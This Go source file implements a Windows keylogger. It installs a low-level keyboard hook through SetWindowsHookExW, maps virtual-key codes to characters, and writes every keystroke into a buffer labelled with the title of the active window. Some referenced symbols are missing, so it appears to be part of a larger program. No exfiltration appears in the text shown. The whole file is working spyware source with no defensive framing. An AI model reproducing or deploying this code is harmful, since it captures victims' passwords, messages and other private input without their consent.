package main

import (
	"bytes"
	"fmt"
	"sync"
	"syscall"
	"unsafe"
)

var KEYLOG_BUFFER bytes.Buffer
var KEYLOG_MUTEX sync.Mutex
var LAST_WINDOW = ""

func keyboardHookProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	const WM_KEYDOWN = 0x0100
	const WM_SYSKEYDOWN = 0x0104

	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		kbd := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		activeWindow := getActiveWindow()
		if activeWindow != LAST_WINDOW {
			KEYLOG_MUTEX.Lock()
			KEYLOG_BUFFER.WriteString(fmt.Sprintf("\n[%s]\n", activeWindow))
			KEYLOG_MUTEX.Unlock()
			LAST_WINDOW = activeWindow
		}
		key := mapKey(int(kbd.vkCode))
		if len(key) > 0 {
			KEYLOG_MUTEX.Lock()
			KEYLOG_BUFFER.WriteString(key)
			KEYLOG_MUTEX.Unlock()
		}
	}
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func startKeylogger() {
	hook, _, _ := procSetWindowsHookExW.Call(
		uintptr(WH_KEYBOARD_LL),
		syscall.NewCallback(keyboardHookProc),
		0,
		0,
	)
	if hook == 0 {
		return
	}
	defer procUnhookWindowsHookEx.Call(hook)

	var msg struct {
		hwnd    uintptr
		message uint32
		wParam  uintptr
		lParam  uintptr
		time    uint32
		ptX     int32
		ptY     int32
	}
	for {
		procGetMessageW.Call(
			uintptr(unsafe.Pointer(&msg)),
			0, 0, 0,
		)
	}
}

func getActiveWindow() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 256)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
	return syscall.UTF16ToString(buf)
}

func mapKey(vkCode int) string {
	if vkCode >= 0x30 && vkCode <= 0x5A {
		return string(rune(vkCode))
	}
	switch vkCode {
	case 0x0D:
		return "\n"
	case 0x20:
		return " "
	case 0x08:
		return "[BS]"
	default:
		return ""
	}
}
